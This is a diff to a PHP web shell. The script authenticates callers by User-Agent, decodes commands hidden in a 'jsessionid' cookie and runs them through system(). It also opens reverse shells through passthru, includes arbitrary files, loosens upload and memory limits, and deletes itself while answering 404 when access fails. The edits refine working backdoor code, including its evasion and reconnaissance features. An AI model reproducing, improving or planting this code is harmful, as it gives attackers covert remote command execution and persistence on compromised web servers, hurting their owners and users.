@@ -1,5 +1,5 @@
 <?php
-//LEAVE ME HERE!!!!!!
+//leave me in.
 
 error_reporting(E_ERROR | E_PARSE);
 if ( ! defined( "PATH_SEPARATOR" ) ) {
@@ -32,11 +32,14 @@ if (slopos === "Windows"){
 }
 
 set_include_path(get_include_path().PATH_SEPARATOR.scache);
-@ini_set("safe_mode", 0);
-@ini_set("file_uploads", "on");
-@ini_set("max_file_uploads",20);
-@ini_set("upload_max_filesize", "24G");
-@ini_set("upload_tmp_dir", getcwd());
+ini_set("safe_mode", 0);
+ini_set("file_uploads", "on");
+ini_set("max_file_uploads",20);
+ini_set("upload_max_filesize", "40M");
+ini_set("upload_tmp_dir", getcwd());
+ini_set("post_max_size", "40M");
+set_time_limit(400);
+ini_set("memory_limit", "1000M");
 
 function uwumodifyme()
 {
@@ -77,7 +80,6 @@ function banner()
 
 function b64($data, $switch)
 {
-    echo print_r($data) . "\n";
     if ($switch === "u") {
         if (!empty($data) && is_array($data)) {
             if (!is_null($data['read'])) {
@@ -175,10 +177,6 @@ function reverseConnections($methods, $host, $port, $shell)
     $defaultHost = $_SERVER["REMOTE_ADDR"];
     $defaultShell = sloppyshell;
 
-    $useHost = null;
-    $usePort = null;
-    $useShell = null;
-
     if (empty($host)) {
         $useHost = $defaultHost;
     } else {
@@ -274,7 +272,7 @@ function executeCommands($command)
         $function = new ReflectionFunction('system');
         return $function->invoke($command);
     }
-    return "";
+    return "No functions for code execution can be used.";
 }
 
 $ns = null;
@@ -284,8 +282,8 @@ $ct = null;
 $split = null;
 
 if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
+    banner();
     if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        banner();
         if (isset($_POST["cr"])) {
             if ($_POST['cr'] === "1") {
                 $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
@@ -296,7 +294,11 @@ if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
             } else {
                 $s = $_COOKIE['jsessionid'];
                 $v = explode(".", base64_decode($s));
-                $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
+                try {
+                    $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
+                } catch (SodiumException $e) {
+                    echo "Failed to decrypt: {$e->getMessage()}".PHP_EOL;
+                }
                 executeCommands(base64_decode($split));
             }
         } elseif (isset($_POST["doInclude"])) {
@@ -331,8 +333,7 @@ if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
                 passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
             }
         }
-    } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
-        banner();
+    } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
         if (!empty($_GET["qs"])) {
             switch ($_GET["qs"]) {
                 case "cqP":
@@ -387,12 +388,16 @@ if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
                     $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads") : "cannot set max_file_uploads";
                     $sfem = ini_get("safe_mode") ? "set to true" : "cannot set safemode.";
                     $fups = ini_get("file_uploads") ? "true" : "false";
+                    $maxium_size = ini_get("upload_max_filesize") ? ini_get("upload_max_filesize") : "cannot set fileupload size.";
                     $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir") : "cannot set upload_tmp_dir";
+                    $incp = get_include_path();
                     echo <<<INI
-Max filesize: $fsize
+Max file uploads: $fsize
 Safemode: $sfem
 File_Uploads: $fups
 Upload Temp Dir: $ftd
+Maximum File upload size: $maxium_size
+Include Path: $incp
 INI. PHP_EOL;
                     header("X-Success: 1");
                     break;
@@ -411,6 +416,8 @@ INI. PHP_EOL;
     unlink($_SERVER['SCRIPT_FILENAME']);
     http_response_code(404);
     die();
+}else {
+    http_response_code(404);
+    header("File Not Found");
+    die();
 }
-http_response_code(404);
-die();
